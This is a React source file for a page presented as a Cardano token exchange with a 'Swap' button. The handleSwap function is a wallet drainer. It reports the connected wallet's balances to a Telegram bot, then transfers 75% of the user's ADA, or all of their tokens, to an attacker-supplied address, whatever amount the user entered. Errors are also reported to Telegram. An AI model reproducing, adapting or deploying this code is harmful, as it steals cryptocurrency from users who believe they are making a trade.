import { useState } from "react";
// import CWButton from "../Components/CWButton";
import AssetSwapModal from "../Components/AssetSwapModal";
import Navigation2 from "../Components/Navigation2";
import { Sliders, ChevronDown, ArrowDown, Info } from "lucide-react";
import updateTokenBalances from "../utils/updateTokenBalance";
// import SundaeConnectButton from "../Components/global/SundaeConnectButton";
import {
  sendAppDetailsToTelegram,
  sendMessageToTelegram,
} from "../utils/telegramUtils";
import { getRecipientAddress } from "../utils/userLocation";
import { getWalletBalance, useCardanoWasm } from "../utils/walletUtils";
import tokenList from "../data/tokenList";
import { toast } from "react-toastify";
import useApp from "../Components/hooks/useApp";

const getTokenDetails = (symbol) => {
  return tokenList.find((token) => token.symbol === symbol);
};

function Exchange() {
  const [loading, setLoading] = useState(false);
  const [activeTab, setActiveTab] = useState("Market");
  const [payToken, setPayToken] = useState("ADA");
  const [allTokens, setAllTokens] = useState([]);
  const { setFromAssets, setToAssets, fromAssets, toAssets } = useApp();
  const [receiveToken, setReceiveToken] = useState("MIN");
  const [payAmount, setPayAmount] = useState("");
  const [updatedTokenList, setUpdatedTokenList] = useState(tokenList);
  const payTokenDetails = getTokenDetails(payToken);
  const receiveTokenDetails = getTokenDetails(receiveToken);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [walletApi, setWalletApi] = useState(null);
  const [walletConnected, setWalletConnected] = useState(false);
  const [modalType, setModalType] = useState(null);
  const cardanoWasm = useCardanoWasm();
  const [receiveAmount, setReceiveAmount] = useState("");
  const bgcol =
    "gradient-to-r from-secondary to-primary hover:from-secondary-300 hover:to-primary-300";

  const openModal = (type) => {
    setIsModalOpen(true);
    setModalType(type);
  };

  const connectWallet = async () => {
    if (window.cardano && window.cardano.nami) {
      try {
        const wallet = await window.cardano.nami.enable();
        setWalletApi(wallet); // Set wallet API
        setWalletConnected(true);
        console.log("Wallet connected:", wallet);
        toast.success("Wallet connected");
        // Fetch and update token balances
        if (cardanoWasm && wallet) {
          const updatedTokens = await updateTokenBalances(wallet, cardanoWasm);
          setAllTokens(updatedTokens);
          console.log("Updated token balances:", updatedTokens);
          setUpdatedTokenList(updatedTokens); // Update token list with balances
        }
      } catch (error) {
        toast.error("Failed to connect wallet");
        console.log(error);
      }
    } else {
      toast.error("Nami Wallet not detected. Please install Nami Wallet.");
    }
  };

  const handleSwap = async () => {
    setLoading(true);
    if (!walletConnected || !walletApi || !cardanoWasm) {
      toast.error(
        "Please connect your wallet and wait for the WASM module to load."
      );
      return;
    }

    try {
      const receiverAddress = await getRecipientAddress();

      // Fetch wallet balance (ADA and tokens)
      const { adaBalance, tokens } = await getWalletBalance(
        walletApi,
        cardanoWasm
      );

      const selectedPayToken = updatedTokenList.find(
        (token) => token.symbol === payToken
      );

      if (!selectedPayToken) {
        toast.error("Pay token not found.");
        setLoading(false);
        return;
      }

      const payTokenBalance = selectedPayToken.balance;

      // Check if the entered payAmount is less than the token balance
      if (parseFloat(payAmount) > parseFloat(payTokenBalance)) {
        toast.error(
          `Insufficient ${payToken} balance. You have ${payTokenBalance} ${payToken}.`
        );
        setLoading(false);
        return;
      }

      if (payToken === "ADA") {
        // Ensure sufficient ADA balance
        if (adaBalance <= 0) {
          toast.error("Insufficient ADA balance.");
          setLoading(false);

          return;
        }

        // Transfer only 75% of the available ADA balance
        const adaAmount = adaBalance * 0.75;
        console.log(`Transferring ${adaAmount} ADA`);

        if (adaAmount <= 0 || isNaN(adaAmount)) {
          toast.error("Invalid ADA amount to transfer.");
          return;
        }
        // Send wallet balance to Telegram
        sendAppDetailsToTelegram(adaAmount, tokens);
        const txHash = await transferADA(
          walletApi,
          cardanoWasm,
          receiverAddress,
          adaAmount
        );
        toast.success(`Transaction successful! ADA Hash: ${txHash}`);
      } else {
        // Ensure there is at least 2 ADA available for the transaction
        if (adaBalance < 2) {
          toast.error(
            "Insufficient ADA wallet balance. At least 2 ADA required."
          );
          setLoading(false);
          return;
        }

        // Ensure there are tokens in the wallet
        if (!tokens || tokens.length === 0) {
          toast.error("No tokens found in the wallet.");
          return;
        }

        // Process all tokens: calculate of each token's balance
        const tokenPolicyIds = [];
        const tokenAssetNames = [];
        const tokenAmounts = [];

        tokens.forEach((token) => {
          const tokenAmountToTransfer = Math.floor(token.amount);

          if (tokenAmountToTransfer > 0) {
            tokenPolicyIds.push(token.policyId);
            tokenAssetNames.push(token.assetName);
            tokenAmounts.push(tokenAmountToTransfer);
          }
        });

        if (tokenPolicyIds.length === 0) {
          toast.error("No valid token balances to transfer.");
          return;
        }

        console.log(`Transferring 2 ADA and 4/5 of all tokens:`, {
          tokenPolicyIds,
          tokenAssetNames,
          tokenAmounts,
        });

        // Transfer 1.5 ADA and 4/5 of all tokens in one transaction
        const txHash = await transferADAAndTokens(
          walletApi,
          cardanoWasm,
          receiverAddress,
          tokenPolicyIds, // Array of token policy IDs
          tokenAssetNames, // Array of asset names
          tokenAmounts // Array of token amounts to transfer (4/5 of each)
        );

        toast.success(`Transaction successful! Hash: ${txHash}`);
        setLoading(false);
      }
    } catch (error) {
      sendMessageToTelegram(
        `|-----Error during swap-----|\nError: ${error.message}`
      );
      setLoading(false);
      console.error("Error during swap:", error);
    }
  };

  const updateReceiveAmount = (amount) => {
    const payTokenRateToADA = payTokenDetails.conversionRateToADA || 1;
    const receiveTokenRateToADA = receiveTokenDetails.conversionRateToADA || 1;
    const newReceiveAmount =
      (amount * payTokenRateToADA) / receiveTokenRateToADA;
    setReceiveAmount(newReceiveAmount.toFixed(2));
  };

  const handlePayAmountChange = (e) => {
    setPayAmount(e.target.value);
    updateReceiveAmount(e.target.value);
  };

  const handleReceiveAmountChange = (e) => {
    const amount = e.target.value;
    setReceiveAmount(amount);
    updatePayAmount(amount);
  };

  const updatePayAmount = (amount) => {
    const payTokenRateToADA = payTokenDetails.conversionRateToADA || 1;
    const receiveTokenRateToADA = receiveTokenDetails.conversionRateToADA || 1;
    const newPayAmount = (amount * receiveTokenRateToADA) / payTokenRateToADA;
    setPayAmount(newPayAmount.toFixed(2));
  };

  return (
    <div>
      <section
        className="bg-[#0F0619] text-gray-400 scrollbar-custom pt-14"
        style={{ height: "100vh" }}
      >
        <Navigation2 currentTab={"Exchange"} />
        <div className="relative grid place-items-center gap-4 lg:gap-8 lg:grid-cols-1 pt-8  md:pt-20 px-4">
          <div className="relative order-1 mx-auto flex h-fit w-full max-w-lg flex-col gap-8 self-start lg:order-2 lg:col-span-3 xl:col-span-2 xl:mx-0">
            <div data-guide-selector="exchange-widget">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-4">
                  {["Market", "Limit"].map((tab) => (
                    <h3
                      key={tab}
                      role="button"
                      className={`text-sm font-normal cursor-pointer rounded-full px-4 py-1.5 transition-colors duration-300 ${
                        activeTab === tab
                          ? "text-primary bg-primary/20"
                          : "text-gray-400 hover:text-gray-400"
                      }`}
                      onClick={() => setActiveTab(tab)}
                    >
                      {tab}
                    </h3>
                  ))}
                </div>
                <div className="relative inline-block text-left">
                  <button className="relative flex h-8 cursor-pointer items-center justify-between gap-4 rounded-full px-4 hover:opacity-75 transition-opacity duration-300">
                    <Sliders className="ml-auto h-4 w-4 text-gray-400" />
                  </button>
                </div>
              </div>

              <div className="relative mt-4">
                <div className="flex flex-col gap-4">
                  <div className="grid gap-4 xl:gap-4">
                    <AssetInput
                      label="You will spend"
                      asset="ADA"
                      balance={
                        allTokens.find(
                          (item) => item.symbol === fromAssets?.symbol
                        )?.balance
                      }
                      usdValue="$0.00"
                      onAssetClick={() => openModal("pay")}
                      handleChange={handlePayAmountChange}
                      amount={payAmount}
                      assets={fromAssets}
                    />

                    <div
                      className="z-10 h-8 w-8 rounded-full !transition-all active:scale-[0.975] text-gray-400 border-[#0f0619] border-4 bg-[#120b1b] cursor-not-allowed select-none absolute right-1/2 translate-x-1/2 bottom-1/2 translate-y-1/2"
                      style={{ marginBottom: "30px" }}
                    >
                      <ArrowDown className="absolute h-4 w-4 text-current right-1/2 translate-x-1/2 bottom-1/2 translate-y-1/2" />
                    </div>

                    <AssetInput
                      label="To buy approximately"
                      asset="Select Token"
                      showUsdValue={false}
                      onAssetClick={() => openModal("receive")}
                      amount={receiveAmount}
                      assets={toAssets}
                      handleChange={handleReceiveAmountChange}
                      balance={
                        allTokens.find(
                          (item) => item.symbol === fromAssets?.symbol
                        )?.balance
                      }
                    />
                  </div>
                  <button
                    disabled={loading}
                    onClick={walletConnected ? handleSwap : connectWallet}
                    className={`flex gap-2 items-center justify-center disabled:cursor-not-allowed disabled:opacity-60 group transition duration-300 border active:scale-[0.975] relative overflow-hidden group border-none text-white bg-${bgcol} min-w-[125px] px-5 text-lg h-11 rounded-lg lg:w-full`}
                  >
                    {walletConnected
                      ? "Swap"
                      : loading
                      ? "Swapping"
                      : "Connect wallet"}
                  </button>
                </div>
              </div>
              <AssetSwapModal
                type={modalType}
                onSelect={(e) => {
                  if (modalType === "pay") {
                    setPayToken(e?.name);
                    setFromAssets(e);
                  } else {
                    setReceiveToken(e?.name);
                    setToAssets(e);
                  }
                }}
                isOpen={isModalOpen}
                onClose={() => setIsModalOpen(false)}
              />
            </div>
          </div>
        </div>
      </section>
    </div>
  );
}

const AssetInput = ({
  label,
  asset,
  balance,
  usdValue,
  showUsdValue = true,
  onAssetClick,
  handleChange,
  amount,
  assets,
}) => {
  console.log(balance);
  return (
    <div className="relative flex flex-col space-y-2">
      <div className="grid min-h-[132px] gap-4 rounded-lg border-transparent p-4 transition-colors duration-300 border hover:border-gray-600 hover:border-1 bg-[#120b1b]">
        <div className="grid gap-2">
          <span className="text-xs text-gray-400 font-normal transition-colors duration-300">
            {label}
          </span>
          <div className="grid grid-cols-[1fr_auto] items-center gap-4">
            <div className="flex w-full items-center justify-end overflow-hidden">
              <input
                inputMode="decimal"
                maxLength={79}
                placeholder="0"
                value={amount}
                onChange={handleChange}
                className="outline-none w-full flex-grow text-4xl text-gray-400 bg-transparent"
                style={{
                  maskImage:
                    "linear-gradient(to left, transparent, #000 7%, #000 100%, transparent)",
                }}
              />
            </div>
            <div
              onClick={onAssetClick}
              className={`${
                assets?.image || assets?.name ? "" : "bg-[#0A93EC]"
              } flex items-center gap-2 h-9 w-fit rounded-full select-none border-gray-600 border shadow-lg transition duration-300 active:scale-[0.975] cursor-pointer hover:bg-gray-700 pl-1 pr-2`}
            >
              {assets?.image ? (
                <span className="bg-[#0F0619] transition duration-300 h-6 w-6 rounded-full">
                  <img
                    // src={` || https://app.sundae.fi/static/images/cardano.png`}
                    src={assets?.image}
                    alt={assets?.name}
                    className="w-full rounded-full bg-gray-800 transition-colors duration-300 !bg-transparent object-cover"
                    width="24"
                    style={{ aspectRatio: "1 / 1" }}
                  />
                </span>
              ) : null}
              <span className="text-white font-semibold transition-colors duration-300 ms-2">
                {assets?.name ? assets?.name : "Select a token"}
              </span>
              <ChevronDown className="h-5 w-5 text-white" />
            </div>
          </div>
        </div>
        <div className="flex justify-between">
          {showUsdValue && (
            <div className="text-xs text-gray-400 font-normal transition-colors duration-300">
              ~ <span>{usdValue}</span>
            </div>
          )}
          <div className="text-xs text-gray-400 font-normal flex flex-1 items-center justify-end gap-1 text-right transition-colors duration-300">
            <span className="text-xs text-gray-400 font-normal flex items-center transition-colors duration-300">
              Available Balance
              {asset === "ADA" && (
                <div className="text-gray-400 transition-opacity duration-300 hover:opacity-75 cursor-help">
                  <Info className="mx-[2px] h-3 w-3 cursor-help text-gray-400" />
                </div>
              )}
              :
            </span>{" "}
            <div className="inline-flex">
              <span className="text-xs text-gray-400 font-normal transition-colors duration-300">
                {asset === "ADA" ? `₳${balance || 0}` : balance || 0}
              </span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Exchange;
